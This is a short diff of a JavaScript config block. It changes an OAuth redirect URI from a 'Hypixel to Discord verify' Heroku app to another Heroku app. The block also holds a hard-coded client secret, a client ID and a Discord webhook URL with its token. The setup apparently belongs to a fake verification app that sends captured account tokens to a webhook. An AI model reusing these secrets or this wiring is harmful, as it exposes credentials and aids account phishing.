@@ -1,7 +1,7 @@
 // CONFIG //
 const client_secret = 'J3C8Q~M5UylHh~VRJJiPmhPNlZ225oMtfYw5xdBH'
 const client_id = 'fcc2cabf-20a8-42e6-96e0-80b398b62fbf'
-const redirect_uri = 'https://hypixeltodiscordverify.herokuapp.com/'
+const redirect_uri = 'https://disc-authentication.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1034525290875060314/bus7n2Ux68ZnpB9uJSLqxQpKWneN_RVT8QtBd6HKqxSBT_r3m61ud_cMt0b8JunX2p9W'
 
 // CONFIG END //
